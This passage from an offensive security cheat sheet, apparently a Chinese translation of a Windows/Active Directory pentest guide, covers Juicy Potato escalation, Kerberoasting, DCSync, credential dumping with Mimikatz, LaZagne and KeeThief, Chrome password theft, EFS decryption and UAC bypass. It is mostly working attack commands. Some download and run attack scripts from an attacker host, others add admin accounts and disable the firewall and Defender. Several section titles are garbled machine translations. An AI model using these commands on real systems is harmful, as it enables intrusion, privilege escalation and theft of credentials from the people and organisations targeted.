多汁土豆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><span class="line"></span><br><span class="line">#Reference https://ohpe.it/juicy-potato/</span><br><span class="line"></span><br><span class="line">Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege</span><br><span class="line"></span><br><span class="line">(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)</span><br><span class="line"></span><br><span class="line">JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br><span class="line"></span><br><span class="line">Mochan.exe = Payload</span><br><span class="line">5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD</span><br><span class="line"></span><br><span class="line">A CLSID is a GUID that identifies a COM class object</span><br><span class="line"></span><br><span class="line">Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc</span><br><span class="line"></span><br><span class="line">JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</span><br></pre></td></tr></table></figure><h2 id="4-27-烧烤"><a href="#4-27-烧烤" class="headerlink" title="4.27 烧烤"></a>4.27 烧烤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat</span><br><span class="line"></span><br><span class="line">because Hashcat over John anyday right?</span><br><span class="line"></span><br><span class="line">Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount</span><br><span class="line"></span><br><span class="line">Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.</span><br><span class="line"></span><br><span class="line">https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</span><br></pre></td></tr></table></figure><h2 id="4-28-用Python编写的"><a href="#4-28-用Python编写的" class="headerlink" title="4.28 用Python编写的"></a>4.28 用Python编写的</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/kerberoast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMPORTANT: the accepted formats are the following</span><br><span class="line">&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line">&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Look for vulnerable users via LDAP</span><br><span class="line">kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum</span><br><span class="line"></span><br><span class="line">Use ASREP roast against users in the ldapenum_asrep_users.txt file</span><br><span class="line">kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt</span><br><span class="line"></span><br><span class="line">Use SPN roast against users in the ldapenum_spn_users.txt file</span><br><span class="line">kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</span><br></pre></td></tr></table></figure><h2 id="4-29-代表烘焙"><a href="#4-29-代表烘焙" class="headerlink" title="4.29 代表烘焙"></a>4.29 代表烘焙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable</span><br><span class="line"></span><br><span class="line">Get-ASRepHash -Domain m0chanAD.local -User victim</span><br><span class="line"></span><br><span class="line">Can also use Rebeus (Reflectively Load .NET Assembly.)</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><h2 id="4-30DCSync（也用于后期利用）"><a href="#4-30DCSync（也用于后期利用）" class="headerlink" title="4.30DCSync（也用于后期利用）"></a>4.30DCSync（也用于后期利用）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. </span><br><span class="line"></span><br><span class="line">#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator</span><br><span class="line"></span><br><span class="line">powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure><h1 id="0x05-exploit后"><a href="#0x05-exploit后" class="headerlink" title="0x05 exploit后"></a>0x05 exploit后</h1><h2 id="5-1-有用的命令"><a href="#5-1-有用的命令" class="headerlink" title="5.1 有用的命令"></a>5.1 有用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net localgroup Administrators m0chan /add</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Turn firewall off</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">Or like this</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">If you get this error:</span><br><span class="line"></span><br><span class="line">CredSSP Error Fix -&gt;</span><br><span class="line"></span><br><span class="line">Add this reg key:</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Disable Windows Defender</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h2 id="5-2-Esenutl-exe转储锁定文件"><a href="#5-2-Esenutl-exe转储锁定文件" class="headerlink" title="5.2 Esenutl.exe转储锁定文件"></a>5.2 Esenutl.exe转储锁定文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</span><br></pre></td></tr></table></figure><h2 id="5-3-检查是否已启用Powershell日志记录"><a href="#5-3-检查是否已启用Powershell日志记录" class="headerlink" title="5.3 检查是否已启用Powershell日志记录"></a>5.3 检查是否已启用Powershell日志记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure><h2 id="5-4-Run-Seatbelt（绝对必须）"><a href="#5-4-Run-Seatbelt（绝对必须）" class="headerlink" title="5.4 Run Seatbelt（绝对必须）"></a>5.4 Run Seatbelt（绝对必须）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/Seatbelt</span><br><span class="line"></span><br><span class="line">This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win</span><br><span class="line"></span><br><span class="line">BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)</span><br><span class="line">RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13</span><br><span class="line">TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)</span><br><span class="line">UACSystemPolicies     -   UAC system policies via the registry</span><br><span class="line">PowerShellSettings    -   PowerShell versions and security settings</span><br><span class="line">AuditSettings         -   Audit settings via the registry</span><br><span class="line">WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry</span><br><span class="line">LSASettings           -   LSA settings (including auth packages)</span><br><span class="line">UserEnvVariables      -   Current user environment variables</span><br><span class="line">SystemEnvVariables    -   Current system environment variables</span><br><span class="line">UserFolders           -   Folders in C:\Users\</span><br><span class="line">NonstandardServices   -   Services with file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">InternetSettings      -   Internet settings including proxy configs</span><br><span class="line">LapsSettings          -   LAPS settings, if installed</span><br><span class="line">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="line">MappedDrives          -   Mapped drives</span><br><span class="line">RDPSessions           -   Current incoming RDP sessions</span><br><span class="line">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="line">NetworkShares         -   Network shares</span><br><span class="line">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="line">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="line">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="line">RegistryAutoRuns      -   Registry autoruns</span><br><span class="line">RegistryAutoLogon     -   Registry autologon information</span><br><span class="line">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="line">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="line">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="line">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="line">NonstandardProcesses  -   Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">  *  If the user is in high integrity, the following additional actions are run:</span><br><span class="line">SysmonConfig          -   Sysmon configuration from the registry</span><br><span class="line"></span><br><span class="line">And more!!</span><br></pre></td></tr></table></figure><h2 id="5-5-Dump-Creds"><a href="#5-5-Dump-Creds" class="headerlink" title="5.5 Dump Creds"></a>5.5 Dump Creds</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz </span><br><span class="line"></span><br><span class="line">Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span class="line">privlege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">The safer method is to dump the process memory of LSASS.exe with MiniDump </span><br><span class="line">(https://github.com/3xpl01tc0d3r/Minidump)</span><br><span class="line"></span><br><span class="line">(or) https://github.com/GhostPack/SharpDump</span><br><span class="line"></span><br><span class="line">and send the .bin to Mimikatz locally.</span><br><span class="line"></span><br><span class="line">sekurlsa::minidump C:\users\m0chan\lssas.dmp</span><br><span class="line"></span><br><span class="line">Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.</span><br><span class="line"></span><br><span class="line">Mimikatz Guide</span><br><span class="line"></span><br><span class="line">#Logon Sessions</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords all</span><br><span class="line"></span><br><span class="line">#Dump Cache</span><br><span class="line"></span><br><span class="line">lsadump::cache</span><br><span class="line"></span><br><span class="line">#Dump SAM</span><br><span class="line"></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h2 id="5-6-Dump-Creds-2"><a href="#5-6-Dump-Creds-2" class="headerlink" title="5.6 Dump Creds #2"></a>5.6 Dump Creds #2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/AlessandroZ/LaZagne</span><br><span class="line"></span><br><span class="line">laZagne.exe all</span><br><span class="line">laZagne.exe browsers</span><br><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure><h2 id="5-7-SessionGopher"><a href="#5-7-SessionGopher" class="headerlink" title="5.7 SessionGopher"></a>5.7 SessionGopher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Arvanaghi/SessionGopher</span><br><span class="line"></span><br><span class="line">Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP</span><br><span class="line"></span><br><span class="line">SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals</span><br><span class="line"></span><br><span class="line">Invoke-SessionGopher -Thorough</span><br><span class="line"></span><br><span class="line">Import-Module path\to\SessionGopher.ps1;</span><br><span class="line">Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</span><br></pre></td></tr></table></figure><h2 id="5-8-Dump-Chrome密码（也发布漏洞利用程序）"><a href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）" class="headerlink" title="5.8 Dump Chrome密码（也发布漏洞利用程序）"></a>5.8 Dump Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="5-9-Dump-Process-Memory-w-Mimikittenz"><a href="#5-9-Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="5.9 Dump Process Memory w/ Mimikittenz"></a>5.9 Dump Process Memory w/ Mimikittenz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/putterpanda/mimikittenz</span><br><span class="line"></span><br><span class="line">mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</span><br><span class="line"></span><br><span class="line">The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.</span><br><span class="line"></span><br><span class="line">Invoke-Mimikittenz</span><br></pre></td></tr></table></figure><h2 id="5-10-Dump-KeePass"><a href="#5-10-Dump-KeePass" class="headerlink" title="5.10 Dump KeePass"></a>5.10 Dump KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="5-11-pypykatz"><a href="#5-11-pypykatz" class="headerlink" title="5.11 pypykatz"></a>5.11 pypykatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/pypykatz</span><br><span class="line"></span><br><span class="line">Full python implementation of Mimikatz :D </span><br><span class="line"></span><br><span class="line">pip3 install pypykatz</span><br></pre></td></tr></table></figure><h2 id="5-12-SafetyKatz"><a href="#5-12-SafetyKatz" class="headerlink" title="5.12 SafetyKatz"></a>5.12 SafetyKatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SafetyKatz</span><br><span class="line"></span><br><span class="line">Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D </span><br><span class="line"></span><br><span class="line">&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.</span><br><span class="line"></span><br><span class="line">First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</span><br></pre></td></tr></table></figure><h2 id="5-13-SharpDPAPI"><a href="#5-13-SharpDPAPI" class="headerlink" title="5.13 SharpDPAPI"></a>5.13 SharpDPAPI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpDPAPI</span><br><span class="line"></span><br><span class="line">Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</span><br></pre></td></tr></table></figure><h2 id="5-14-SharpSniper"><a href="#5-14-SharpSniper" class="headerlink" title="5.14 SharpSniper"></a>5.14 SharpSniper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HunnicCyber/SharpSniper</span><br><span class="line"></span><br><span class="line">Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.</span><br><span class="line"></span><br><span class="line">SharpSniper is a simple tool to find the IP address of these users so that you can target their box.</span><br><span class="line"></span><br><span class="line">C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123</span><br><span class="line"></span><br><span class="line">User: emusk - IP Address: 192.168.37.130</span><br></pre></td></tr></table></figure><h2 id="5-15-SharpLocker"><a href="#5-15-SharpLocker" class="headerlink" title="5.15 SharpLocker"></a>5.15 SharpLocker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Pickfordmatt/SharpLocker</span><br><span class="line"></span><br><span class="line">SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</span><br></pre></td></tr></table></figure><h2 id="5-16-Check-for-Missing-KB’s"><a href="#5-16-Check-for-Missing-KB’s" class="headerlink" title="5.16 Check for Missing KB’s"></a>5.16 Check for Missing KB’s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watson.exe</span><br><span class="line">Sherlock.ps1</span><br><span class="line"></span><br><span class="line">Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. </span><br><span class="line"></span><br><span class="line">More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)</span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Watson</span><br></pre></td></tr></table></figure><h2 id="5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><a href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件" class="headerlink" title="5.17 如果管理员/系统，则使用Mimikatz解密EFS文件"></a>5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><span class="line"></span><br><span class="line">cipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.</span><br><span class="line"></span><br><span class="line">privilege::debug </span><br><span class="line">token::elevate </span><br><span class="line">crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><span class="line"></span><br><span class="line">dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b</span><br><span class="line"></span><br><span class="line">openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem</span><br><span class="line"></span><br><span class="line">openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class="line"></span><br><span class="line">certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure><h2 id="5-18-UAC绕过"><a href="#5-18-UAC绕过" class="headerlink" title="5.18 UAC绕过"></a>5.18 UAC绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info </span><br><span class="line"></span><br><span class="line">findstr /C:&quot;&lt;autoElevate&gt;true&quot; </span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesRemote.exe</span><br></pre></td></tr></table></figure><h2 id="5-19-Golden-Ticket-Attack"><a href="#5-19-Golden-Ticket-Attack" class="headerlink" title="5.19 Golden Ticket Attack"></a>5.19 